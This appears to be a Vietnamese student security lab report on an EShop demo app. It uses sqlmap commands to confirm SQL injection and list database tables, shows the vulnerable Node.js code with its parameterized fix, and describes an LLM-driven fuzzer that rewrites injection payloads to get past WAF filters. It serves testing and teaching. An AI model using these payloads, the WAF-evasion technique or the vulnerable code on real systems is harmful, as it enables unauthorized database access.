# BÁO CÁO THỰC NGHIỆM: KIỂM CHỨNG BẢO MẬT VỚI SQLMAP VÀ NGHIÊN CỨU AI FUZZER THÍCH ỨNG

---

## MỤC LỤC
1. [TỔNG QUAN VÀ BỐI CẢNH THỬ NGHIỆM](#1-tổng-quan-và-bối-cảnh-thử-nghiệm)
2. [THỰC NGHIỆM KIỂM CHỨNG BẢO MẬT BẰNG SQLMAP](#2-thực-nghiệm-kiểm-chứng-bảo-mật-bằng-sqlmap)
   - [2.1. Chuỗi tích hợp công cụ DevSecOps (DAST Toolchain)](#21-chuỗi-tích-hợp-công-cụ-devsecops-dast-toolchain)
   - [2.2. Triển khai 3 kịch bản kiểm thử sqlmap](#22-triển-khai-3-kịch-bản-kiểm-thử-sqlmap)
   - [2.3. Phân tích kết quả log thực tế](#23-phân-tích-kết-quả-log-thực-tế)
   - [2.4. Phân tích nguyên nhân gốc và giải pháp khắc phục](#24-phân-tích-nguyên-nhân-gốc-và-giải-pháp-khắc-phục)
   - [2.5. Đánh giá ưu điểm và điểm mù của sqlmap](#25-đánh-giá-ưu-điểm-và-điểm-mù-của-sqlmap)
3. [NGHIÊN CỨU VÀ PHÁT TRIỂN MODULE AI FUZZER THÍCH ỨNG](#3-nghiên-cứu-và-phát-triển-module-ai-fuzzer-thích-ứng)
   - [3.1. Đặt vấn đề: Giới hạn của Fuzzer từ điển tĩnh](#31-đặt-vấn-đề-giới-hạn-của-fuzzer-từ-điển-tĩnh)
   - [3.2. Kiến trúc vòng lặp phản hồi thích ứng (Adaptive Feedback Loop)](#32-kiến-trúc-vòng-lặp-phản-hồi-thích-ứng-adaptive-feedback-loop)
   - [3.3. Môi trường kiểm thử thực nghiệm (WAF Lab cổng 3001)](#33-môi-trường-kiểm-thử-thực-nghiệm-waf-lab-cổng-3001)
   - [3.4. Đo lường và đánh giá đối chứng Benchmark 3 nhánh](#34-đo-lường-và-đánh-giá-đối-chứng-benchmark-3-nhánh)
   - [3.5. Đánh giá học thuật: Trade-off và Tính tái lập (Reproducibility)](#35-đánh-giá-học-thuật-trade-off-và-tính-tái-lập-reproducibility)
   - [3.6. Thảo luận mở rộng: Vòng đời thích ứng khi WAF nâng cấp](#36-thảo-luận-mở-rộng-vòng-đời-thích-ứng-khi-waf-nâng-cấp)
4. [KẾT LUẬN](#4-kết-luận)

---

## 1. TỔNG QUAN VÀ BỐI CẢNH THỬ NGHIỆM

Trong quy trình phát triển và kiểm thử phần mềm hiện đại (DevSecOps), kiểm thử bảo mật động (Dynamic Application Security Testing - DAST) đóng vai trò then chốt nhằm phát hiện các lỗ hổng tồn tại trên ứng dụng ở trạng thái đang chạy (runtime). Tuy nhiên, các công cụ quét tự động bề mặt thường dừng lại ở mức cảnh báo tiềm ẩn, dẫn đến nguy cơ báo động giả (False Positives) hoặc thiếu bằng chứng xác thực mức độ ảnh hưởng của lỗ hổng.

Báo cáo này tập trung vào hai nội dung nghiên cứu thực nghiệm chuyên sâu trên ứng dụng thực nghiệm EShop:
1. **Kiểm chứng sâu (Data-driven Verification) với `sqlmap`:** Xây dựng chuỗi tích hợp từ cảnh báo của công cụ quét tự động ban đầu, nạp gói tin HTTP thô để xác minh và trích xuất cấu trúc CSDL thực tế.
2. **Nghiên cứu ứng dụng AI Fuzzer thích ứng (Adaptive Feedback Loop):** Giải quyết bài toán vượt qua bộ lọc đầu vào (WAF) khi phương pháp kiểm thử dùng danh sách từ điển tĩnh truyền thống bị vô hiệu hóa.

---

## 2. THỰC NGHIỆM KIỂM CHỨNG BẢO MẬT BẰNG SQLMAP

### 2.1. Chuỗi tích hợp công cụ DevSecOps (DAST Toolchain)
Quy trình thực nghiệm được thiết kế khép kín theo chuỗi công cụ tự động hóa:
* **Giai đoạn 1 (Quét tự động):** Công cụ OWASP ZAP rà soát toàn bộ bề mặt ứng dụng EShop và phát hiện một cảnh báo duy nhất về SQL Injection tại:
  $$\text{Endpoint: } \texttt{GET /api/products?search=\%27}$$
  *(Bằng chứng: Máy chủ phản hồi mã lỗi HTTP 500 Internal Server Error).*
* **Giai đoạn 2 (Trích xuất gói tin):** Gói tin HTTP hoàn chỉnh được trích xuất từ proxy thành tệp `search_request.txt` (`search.req`), lưu trữ đầy đủ các tiêu đề (Headers), Cookie, Origin, Referer và mã thông báo xác thực người dùng (**JWT Bearer Token**).
* **Giai đoạn 3 (Kiểm chứng chuyên sâu):** Sử dụng `sqlmap` nạp trực tiếp gói tin thô để kiểm thử tự động, trích xuất dữ liệu đối chứng mà không cần cấu hình thủ công lại phiên làm việc.

---

### 2.2. Triển khai 3 kịch bản kiểm thử sqlmap
Hệ thống kịch bản kiểm thử được tự động hóa qua tập lệnh `run_sqlmap_demo.sh`, ánh xạ trọn vẹn 3 nguyên lý cốt lõi của kiểm thử tự động:

```
                                  ┌── [Kịch bản 1] Khảo sát ban đầu & Kiểm tra cấu hình kết nối
                                  │
BỘ KỊCH BẢN KIỂM THỬ SQLMAP ──────┼── [Kịch bản 2] Quét kiểm thử tham số GET trực tiếp (-p search)
                                  │
                                  └── [Kịch bản 3] Record & Playback trích xuất CSDL qua Raw Request
```

#### Kịch bản 1: Khảo sát ban đầu & Kiểm tra cấu hình kết nối (Target Fingerprinting)
* **Mục tiêu:** Xác định trạng thái hoạt động của máy chủ mục tiêu, phiên bản nền tảng công nghệ web và hệ quản trị CSDL backend mà không can thiệp sâu vào cấu trúc dữ liệu.
* **Lệnh thực thi:**
  ```bash
  sqlmap -u "http://localhost:3000/api/products?search=phone" --batch --banner
  ```

#### Kịch bản 2: Quét kiểm thử tham số GET trực tiếp (Direct Parameter Scanning)
* **Mục tiêu:** Chỉ định cụ thể tham số nghi vấn (`-p search`), áp dụng phân tích đối chứng sai khác (Differential Analysis) và kiểm tra tính khả thi của việc khai thác trên hệ CSDL SQLite.
* **Lệnh thực thi:**
  ```bash
  sqlmap -u "http://localhost:3000/api/products?search=phone" -p search --dbms=SQLite --batch --current-db
  ```

#### Kịch bản 3: Tái hiện khai thác qua Raw HTTP Request (Record & Playback)
* **Mục tiêu:** Tái hiện nguyên vẹn ngữ cảnh gói tin HTTP thô từ công cụ bắt gói tin (kèm JWT Bearer Token hợp lệ), thực thi kiểm thử nâng cao và trích xuất danh sách cấu trúc bảng dữ liệu (`--tables`).
* **Lệnh thực thi:**
  ```bash
  sqlmap -r search_request.txt -p search --dbms=SQLite --batch --tables
  ```

---

### 2.3. Phân tích kết quả log thực tế

Toàn bộ kết quả thực nghiệm thực tế được ghi nhận tại thư mục `demo/sqlmap/sqlmap-logs/`:

#### Log Kịch bản 1 (`scenario_1_proxy_check.log`):
* `sqlmap` kết nối thành công tới cổng 3000 và nhận diện chính xác cấu trúc nền tảng:
  ```text
  web application technology: Express
  back-end DBMS: SQLite
  ```

#### Log Kịch bản 2 (`scenario_2_param_scan.log`):
* `sqlmap` tự động tái sử dụng phiên làm việc đã lưu (`resumed from stored session`), xác nhận tham số `search (GET)` dính lỗi SQL Injection dạng **UNION query** (Generic UNION query 6 cột).
* Đối với cờ `--current-db`, công cụ ghi nhận cảnh báo kỹ thuật chuẩn xác:
  ```text
  [WARNING] on SQLite it is not possible to get name of the current database
  ```
  *Giải thích kỹ thuật:* Khác với MySQL, Oracle hay PostgreSQL quản lý dữ liệu qua hệ thống Database Catalog phân cấp, **SQLite là hệ quản trị CSDL dạng tệp tin cục bộ (file-based single file `database.sqlite`)**. Do đó, SQLite không có khái niệm "tên CSDL hiện tại", việc `sqlmap` xuất cảnh báo này là hoàn toàn chính xác theo đặc tả kỹ thuật của hệ thống.

#### Log Kịch bản 3 (`scenario_3_raw_request.log`):
* `sqlmap` phân tích tệp `search_request.txt`, phát hiện lỗ hổng JWT (thiếu trường `exp`), tiêm payload UNION query:
  ```sql
  search=phone' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qpvkq','...'),'qvpbq'),NULL,NULL,NULL-- vMds
  ```
* **Kết quả khai thác thành công:** `sqlmap` trích xuất trọn vẹn danh mục **7 bảng dữ liệu thật** từ tệp SQLite của hệ thống:
  ```text
  [7 tables]
  +-----------------+
  | categories      |
  | coupon_usage    |
  | coupons         |
  | orders          |
  | products        |
  | sqlite_sequence |
  | users           |
  +-----------------+
  ```

---

### 2.4. Phân tích nguyên nhân gốc và giải pháp khắc phục

#### Nguyên nhân gốc (Vulnerability Root Cause):
Tại tệp mã nguồn `backend/server.js` (dòng 141 – 151), đoạn mã xử lý tìm kiếm sản phẩm vi phạm trực tiếp nguyên tắc bảo mật cơ bản khi sử dụng kỹ thuật **nối chuỗi trực tiếp (String Concatenation)** biến đầu vào chưa kiểm soát vào câu lệnh SQL:

```javascript
// ⚠️ LỖ HỔNG BẢO MẬT: Nối chuỗi trực tiếp dữ liệu người dùng
app.get("/api/products", (req, res) => {
  const searchQuery = req.query.search;
  if (searchQuery) {
    const query = `SELECT * FROM products WHERE name LIKE '%${searchQuery}%'`;
    db.all(query, [], (err, rows) => {
      if (err) return res.status(500).send(`<h1>Database Error</h1><p>${err.message}</p>`);
      res.json(rows);
    });
  } // ...
});
```
Khi người dùng nhập dấu nháy đơn (`'`), cấu trúc câu truy vấn bị phá vỡ (`LIKE '%'%''`), dẫn đến lỗi cú pháp CSDL trả về mã HTTP 500 và cho phép kẻ tấn công chèn thêm các mệnh đề điều kiện hoặc câu truy vấn `UNION`.

#### Giải pháp khắc phục triệt để (Secure Remediation):
Áp dụng cơ chế **Truy vấn có tham số hóa (Parameterized Query / Prepared Statements)** theo tiêu chuẩn an toàn mã nguồn SEC-01. Cơ chế này phân tách hoàn toàn giữa logic câu lệnh SQL và dữ liệu đầu vào:

```javascript
// ✅ GIẢI PHÁP AN TOÀN: Sử dụng tham số hóa phân tách dữ liệu
app.get("/api/products", (req, res) => {
  const searchQuery = req.query.search;
  if (searchQuery) {
    const query = "SELECT * FROM products WHERE name LIKE ?";
    const searchPattern = `%${searchQuery}%`;
    db.all(query, [searchPattern], (err, rows) => {
      if (err) return res.status(500).json({ error: "Lỗi xử lý cơ sở dữ liệu." });
      res.json(rows);
    });
  } // ...
});
```

---

### 2.5. Đánh giá ưu điểm và điểm mù của sqlmap

* **Ưu điểm vượt trội:**
  * Khả năng tự động hóa kiểm thử mức dữ liệu (Data-driven) mạnh mẽ với kho payload phong phú hỗ trợ 6 kỹ thuật tiêm lệnh (BEUSTQ).
  * Hỗ trợ nguyên lý *Record & Playback* xuất sắc thông qua cờ `-r`, tiết kiệm thời gian thiết lập lại phiên làm việc.
* **Điểm mù kỹ thuật (Blind Spots):**
  * `sqlmap` phụ thuộc vào các kịch bản tamper có sẵn. Khi gặp các hệ thống có bộ lọc đầu vào (WAF) tùy biến hoặc bộ lọc phi chuẩn, `sqlmap` sẽ liên tục thử nghiệm danh sách payload mặc định dẫn đến việc bị chặn hàng loạt hoặc bị khóa IP mà không thể tự động suy luận để điều chỉnh cú pháp thích ứng trong thời gian thực.

---

## 3. NGHIÊN CỨU VÀ PHÁT TRIỂN MODULE AI FUZZER THÍCH ỨNG

### 3.1. Đặt vấn đề: Giới hạn của Fuzzer từ điển tĩnh
Các công cụ Fuzzer truyền thống chủ yếu hoạt động theo phương thức "gửi mù" (Brute-force) một danh sách từ điển payload tĩnh có sẵn. Khi ứng dụng triển khai lớp phòng thủ lọc đầu vào (WAF), toàn bộ các payload chứa từ khóa hoặc khoảng trắng mặc định đều bị máy chủ chặn (HTTP 400/403). Điều này dẫn đến hai hạn chế nghiêm trọng:
1. Tiêu tốn băng thông mạng và số lượng request lớn.
2. Dễ bị hệ thống phòng thủ phát hiện và kích hoạt cơ chế khóa IP kiểm thử.

---

### 3.2. Kiến trúc vòng lặp phản hồi thích ứng (Adaptive Feedback Loop)

Để khắc phục điểm mù trên, module `ai_fuzzer.py` được thiết kế theo mô hình **AI Fuzzer Mức 2 (Closed-loop Adaptive Fuzzing)** với chu trình 4 giai đoạn khép kín:

```
[1. Test Input ban đầu] ──> [2. Server WAF Lab] ──> [Trả về HTTP 403 & Lý do chặn]
          ▲                                                           │
          │                                                           ▼
[4. Sinh Payload thích ứng] <── [3. AI Reasoning (LLM) phân tích phản hồi WAF]
```

1. **Phát Test Input (Injection):** Fuzzer gửi payload cơ sở ban đầu (`' OR '1'='1`).
2. **Thu thập phản hồi (Observation):** Máy chủ WAF chặn gói tin, phản hồi mã HTTP 403 Forbidden kèm chuỗi thông báo nguyên nhân (ví dụ: `Keyword or space detected`).
3. **Suy luận ngữ nghĩa (AI Reasoning):** Fuzzer đóng gói bối cảnh và lý do chặn vào prompt, gửi tới mô hình ngôn ngữ lớn (LLM):
   * *Yêu cầu:* Phân tích cơ chế bộ lọc và gợi ý kỹ thuật thay thế tương đương ngữ nghĩa trong chuẩn SQL.
   * *Suy luận:* Để thay thế khoảng trắng mà không vi phạm regex kiểm tra từ khóa, chuẩn SQL cho phép sử dụng chú thích nội tuyến (inline comment) dạng `/**/`.
4. **Tái kiểm thử và đạt Checkpoint:** AI trả về payload thích ứng `1'/**/OR/**/'1'='1'`. Fuzzer gửi lại payload này, vượt qua bộ lọc thành công và nhận phản hồi **HTTP 200 OK**.

---

### 3.3. Môi trường kiểm thử thực nghiệm (WAF Lab cổng 3001)

Nhằm phục vụ bài thí nghiệm có đối chứng, hệ thống thiết lập máy chủ lab riêng biệt tại tệp `backend/server_fuzzer_lab.js` (chạy trên cổng 3001) tích hợp middleware `backend/waf_middleware.js` hỗ trợ 2 cấp độ lọc:
* **Level 1 (Mặc định thử nghiệm):** Áp dụng biểu thức chính quy bắt khoảng trắng bao quanh từ khóa SQL (`/(^|\s+)(OR|AND|UNION|SELECT)(\s+|$)/i`). Cấp độ này mô phỏng lỗi lọc ngây thơ, có thể bị bypass bằng kỹ thuật comment lồng `/**/`.
* **Level 2 (Strict nâng cao):** Chặn cả comment (`/*`, `*/`, `--`), dấu chấm phẩy và ranh giới từ khóa.

---

### 3.4. Đo lường và đánh giá đối chứng Benchmark 3 nhánh

Thực nghiệm đo lường được tiến hành theo phương pháp kiểm soát biến số qua tập lệnh `benchmark_fuzzer.py` trên cùng một máy chủ mục tiêu (cổng 3001) trong ngân sách giới hạn $N \le 50$ requests.

#### Bảng số liệu kết quả thực nghiệm đối chứng:

| Nhánh kiểm thử | Phương pháp sinh payload | Số requests cần gửi | Thời gian hoàn tất (s) | Tỷ lệ giảm request so với Baseline |
|---|---|:---:|:---:|:---:|
| **Nhánh 1** | Mảng từ điển mẫu tĩnh cổ điển (Synthetic Wordlist) | **14** | 0.027s | Baseline (0%) |
| **Nhánh 2** | Payload AI sinh sẵn không có feedback (Mức 1) | **6** | 0.002s | Giảm **57.1%** |
| **Nhánh 3** | **AI Fuzzer Feedback Loop thích ứng (Mức 2)** | **2** | 0.450s | **Giảm 85.7%** |

*(Số liệu được kết xuất chuẩn hóa từ tệp `demo/ai_fuzzer/benchmark_results.json`).*

#### Phân tích biểu đồ hiệu năng:
* **Nhánh 1:** Do nạp danh sách tĩnh, fuzzer phải thử lần lượt từng phần tử; các chuỗi có khoảng trắng đều bị WAF từ chối cho đến khi tình cờ duyệt đến chuỗi thứ 14 có định dạng `/**/`.
* **Nhánh 3:** Nhờ có vòng lặp phản hồi, fuzzer chỉ mất **đúng 1 request mồi để nhận diện bộ lọc** và **1 request tiếp theo để khai thác thành công**, tiết kiệm tới **85.7% lưu lượng mạng**.

---

### 3.5. Đánh giá học thuật: Trade-off và Tính tái lập (Reproducibility)

#### Phân tích sự đánh đổi (Trade-off):
* **Lợi thế:** Giảm thiểu đột biến số lượng request, giảm thiểu nguy cơ làm quá tải dịch vụ (Denial of Service) và hạn chế kích hoạt các cơ chế Rate-limiting của hạ tầng mạng.
* **Chi phí đánh đổi:** Thời gian phản hồi của Nhánh 3 cao hơn (~0.45s so với 0.027s) do phát sinh độ trễ mạng (Network Latency) và thời gian suy luận (Inference Time) khi gọi API LLM.

#### Đảm bảo Tính tái lập (Reproducibility) trong kiểm thử phần mềm:
* Mô hình AI mang tính chất ngẫu nhiên thống kê (Stochastic/Non-deterministic), có thể sinh ra các biến thể khác nhau giữa các lần chạy hoặc gặp sự cố gián đoạn đường truyền mạng khi báo cáo.
* **Giải pháp chuẩn hóa:** Module tích hợp cờ `--playback` đọc dữ liệu từ tệp `fuzzer_cache.json`. Chế độ này "đóng băng" kết quả thực nghiệm thực tế, cho phép tái hiện quy trình thích ứng một cách nhất quán 100% mà không phụ thuộc vào kết nối Internet, đáp ứng chặt chẽ tiêu chuẩn kiểm chứng khoa học.
* **Cơ chế dự phòng:** Hàm `heuristic_adaptation` đóng vai trò lưới an toàn (fallback) bằng mã nguồn Python tĩnh, đảm bảo công cụ không bị dừng đột ngột trong trường hợp mất kết nối API.

---

### 3.6. Thảo luận mở rộng: Vòng đời thích ứng khi WAF nâng cấp

Một câu hỏi học thuật quan trọng: *Khi hệ thống phòng thủ phát hiện kỹ thuật `/**/` và nâng cấp WAF lên Level 2 (chặn cả comment), AI Fuzzer có còn giá trị không?*

Câu trả lời là **CÓ**, và đây chính là ưu điểm vượt trội của AI so với từ điển tĩnh:
* **Với từ điển tĩnh:** Khi WAF thay đổi luật, toàn bộ danh sách 10.000 payload cũ trở nên vô dụng; chuyên gia bảo mật phải phân tích và biên soạn lại từ điển mới thủ công.
* **Với AI Fuzzer:** Khi payload `1'/**/OR/**/'1'='1'` bị WAF Level 2 chặn lại (HTTP 403), tệp cache cũ tự động bị hủy (Cache Invalidation). Vòng lặp `while` trong `ai_fuzzer.py` tiếp tục hoạt động, đóng gói lỗi mới gửi về cho LLM. AI sẽ phân tích cú pháp SQLite ở mức sâu hơn (sử dụng ký tự xuống dòng `%0A`, mã hóa URL, hoặc cấu trúc ngoặc đơn không khoảng trắng `1'OR('1'='1')`) để tiếp tục sinh ra phương án vượt lọc thế hệ tiếp theo.

---

## 4. KẾT LUẬN

1. **Về công cụ sqlmap:** Đã chứng minh tính hiệu quả của phương pháp *Record & Playback* thông qua việc tái hiện gói tin `search_request.txt`, xác minh thành công lỗ hổng SQL Injection trên tham số `search` và trích xuất cấu trúc 7 bảng dữ liệu CSDL SQLite. Lỗ hổng đã được xác định nguyên nhân gốc và đề xuất giải pháp vá bằng *Parameterized Query*.
2. **Về mô hình AI Fuzzer thích ứng:** Thực nghiệm đã chứng minh tính ưu việt của kiến trúc *Feedback Loop* (Mức 2), giúp giảm **85.7% số lượng request thử nghiệm** so với phương pháp vét cạn từ điển tĩnh truyền thống. Hệ thống được đóng gói hoàn chỉnh với cơ chế Offline Playback đảm bảo tính tái lập kết quả thực nghiệm phục vụ công tác báo cáo và đánh giá học thuật.
